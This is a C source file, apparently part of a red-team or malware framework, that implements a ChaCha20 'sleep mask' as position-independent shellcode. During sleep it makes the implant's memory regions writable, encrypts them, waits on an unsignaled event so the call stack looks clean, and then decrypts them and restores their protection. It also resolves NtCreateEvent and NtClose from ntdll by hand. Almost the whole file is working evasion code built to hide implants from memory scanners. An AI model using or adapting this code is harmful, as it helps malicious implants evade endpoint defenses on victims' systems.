// chacha_sleep — ChaCha20-based sleep mask.
//
// Uses a 256-bit ChaCha20 stream cipher instead of simple XOR.
// Advantages over XOR-16:
//   - Full 256-bit key + 96-bit nonce — no 16-byte pattern repetition
//   - Key-stream is pseudo-random: encrypted memory looks like noise
//   - Statistical analysis won't reveal key period (XOR-16 has period=16)
//   - Still symmetric: same operation encrypts and decrypts (counter=0)
//
// The ChaCha20 implementation is embedded as PIC — no external deps.
//
// Sleep method: NtWaitForSingleObject on unsignaled event (clean stack).

#include "../../sleep_mask_api.h"

// Forward declarations — helpers MUST be defined AFTER sleep_mask_entry
// so that sleep_mask_entry is at offset 0 of .text (PIC requirement).
static void  chacha20_block(uint32_t out[16], const uint32_t in[16]);
static void  chacha20_crypt(uint8_t* data, uint32_t len,
                            const uint8_t* key32, const uint8_t* nonce12);
static int   pic_strcmp(const char* a, const char* b);
static void* pic_get_proc(void* module_base, const char* func_name);

typedef NTSTATUS (__stdcall *pfn_NtCreateEvent)(HANDLE*, DWORD, void*, int, BOOL);
typedef NTSTATUS (__stdcall *pfn_NtClose)(HANDLE);

// ---- ENTRY POINT (must be first defined function) -------------------------

void __cdecl sleep_mask_entry(SleepMaskCtx* ctx) {
    uint32_t i;
    SIZE_T sz;
    PVOID base;
    ULONG old_prot;

    // Build 32-byte key and 12-byte nonce from the 16-byte seed.
    // Key = seed[0..15] repeated twice (32 bytes).
    // Nonce = seed[4..15] (12 bytes).
    uint8_t key32[32];
    uint8_t nonce12[12];
    for (int k = 0; k < 16; ++k) { key32[k] = ctx->key[k]; key32[16+k] = ctx->key[k] ^ 0xA5; }
    for (int k = 0; k < 12; ++k) nonce12[k] = ctx->key[k + 4];

    // Строки на стеке — на x86 литералы генерируют абсолютные адреса,
    // которые невалидны в PIC-шелкоде.
    char s_nce[] = {'N','t','C','r','e','a','t','e','E','v','e','n','t',0};
    char s_nc[]  = {'N','t','C','l','o','s','e',0};

    // Resolve NtCreateEvent for clean-stack wait.
    pfn_NtCreateEvent NtCreateEvent =
        (pfn_NtCreateEvent)pic_get_proc(ctx->ntdll_base, s_nce);
    pfn_NtClose NtClose =
        (pfn_NtClose)pic_get_proc(ctx->ntdll_base, s_nc);

    HANDLE hEvent = 0;
    int use_event = 0;
    if (NtCreateEvent && NtClose) {
        if (NtCreateEvent(&hEvent, 0x1F0003, 0, 1, FALSE) >= 0)
            use_event = 1;
    }

    // 1. Protect RW.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz, 0x04, &old_prot);
    }

    // 2. ChaCha20 encrypt.
    for (i = 0; i < ctx->region_count; ++i)
        chacha20_crypt((uint8_t*)ctx->regions[i].base,
                       ctx->regions[i].size, key32, nonce12);

    // 3. Sleep (prefer NtWaitForSingleObject for clean stack).
    {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -(LONGLONG)ctx->sleep_ms * 10000LL;
        if (use_event)
            ctx->NtWaitForSingleObject(hEvent, FALSE, &timeout);
        else
            ctx->NtDelayExecution(FALSE, &timeout);
    }

    // 4. ChaCha20 decrypt (symmetric: same key + counter=0).
    for (i = 0; i < ctx->region_count; ++i)
        chacha20_crypt((uint8_t*)ctx->regions[i].base,
                       ctx->regions[i].size, key32, nonce12);

    // 5. Restore protection.
    for (i = 0; i < ctx->region_count; ++i) {
        base = ctx->regions[i].base;
        sz   = (SIZE_T)ctx->regions[i].size;
        ctx->NtProtectVirtualMemory(ctx->process_handle, &base, &sz,
                                    (ULONG)ctx->regions[i].original_prot, &old_prot);
    }

    // 6. Cleanup.
    ctx->FlushInstructionCache(ctx->process_handle, 0, 0);
    if (use_event) NtClose(hEvent);

    // Zero crypto material.
    for (int k = 0; k < 32; ++k) key32[k] = 0;
    for (int k = 0; k < 12; ++k) nonce12[k] = 0;
}

// ---- Helpers (defined AFTER entry point) ----------------------------------

#define ROTL32(v, n) (((v) << (n)) | ((v) >> (32 - (n))))

#define QR(a, b, c, d)      \
    a += b; d ^= a; d = ROTL32(d, 16); \
    c += d; b ^= c; b = ROTL32(b, 12); \
    a += b; d ^= a; d = ROTL32(d,  8); \
    c += d; b ^= c; b = ROTL32(b,  7);

static void chacha20_block(uint32_t out[16], const uint32_t in[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; ++i) x[i] = in[i];

    for (int i = 0; i < 10; ++i) { // 20 rounds = 10 double-rounds
        QR(x[0], x[4], x[ 8], x[12])
        QR(x[1], x[5], x[ 9], x[13])
        QR(x[2], x[6], x[10], x[14])
        QR(x[3], x[7], x[11], x[15])
        QR(x[0], x[5], x[10], x[15])
        QR(x[1], x[6], x[11], x[12])
        QR(x[2], x[7], x[ 8], x[13])
        QR(x[3], x[4], x[ 9], x[14])
    }
    for (int i = 0; i < 16; ++i) out[i] = x[i] + in[i];
}

static void chacha20_crypt(uint8_t* data, uint32_t len,
                           const uint8_t* key32, const uint8_t* nonce12) {
    // ChaCha20 state: "expand 32-byte k" + key(8 words) + counter(1) + nonce(3)
    uint32_t state[16];
    state[0] = 0x61707865; // "expa"
    state[1] = 0x3320646e; // "nd 3"
    state[2] = 0x79622d32; // "2-by"
    state[3] = 0x6b206574; // "te k"

    // Key: 32 bytes -> 8 uint32 (little-endian).
    for (int i = 0; i < 8; ++i) {
        state[4 + i] = (uint32_t)key32[i*4]
                     | ((uint32_t)key32[i*4+1] << 8)
                     | ((uint32_t)key32[i*4+2] << 16)
                     | ((uint32_t)key32[i*4+3] << 24);
    }

    // Counter starts at 0.
    state[12] = 0;

    // Nonce: 12 bytes -> 3 uint32.
    for (int i = 0; i < 3; ++i) {
        state[13 + i] = (uint32_t)nonce12[i*4]
                      | ((uint32_t)nonce12[i*4+1] << 8)
                      | ((uint32_t)nonce12[i*4+2] << 16)
                      | ((uint32_t)nonce12[i*4+3] << 24);
    }

    uint32_t block_out[16];
    uint32_t offset = 0;

    while (offset < len) {
        chacha20_block(block_out, state);
        state[12]++; // increment counter

        uint32_t chunk = len - offset;
        if (chunk > 64) chunk = 64;

        uint8_t* ks = (uint8_t*)block_out;
        for (uint32_t i = 0; i < chunk; ++i)
            data[offset + i] ^= ks[i];

        offset += chunk;
    }

    // Zero state from stack.
    for (int i = 0; i < 16; ++i) { state[i] = 0; block_out[i] = 0; }
}

static int pic_strcmp(const char* a, const char* b) {
    while (*a && *a == *b) { a++; b++; }
    return (unsigned char)*a - (unsigned char)*b;
}

static void* pic_get_proc(void* module_base, const char* func_name) {
    unsigned char* base = (unsigned char*)module_base;
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)base;
    IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)(base + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY* exp_dir = &nt->OptionalHeader.DataDirectory[0];
    if (!exp_dir->VirtualAddress) return 0;
    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exp_dir->VirtualAddress);
    DWORD* names    = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(base + exp->AddressOfFunctions);
    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        if (pic_strcmp((const char*)(base + names[i]), func_name) == 0)
            return (void*)(base + funcs[ordinals[i]]);
    }
    return 0;
}
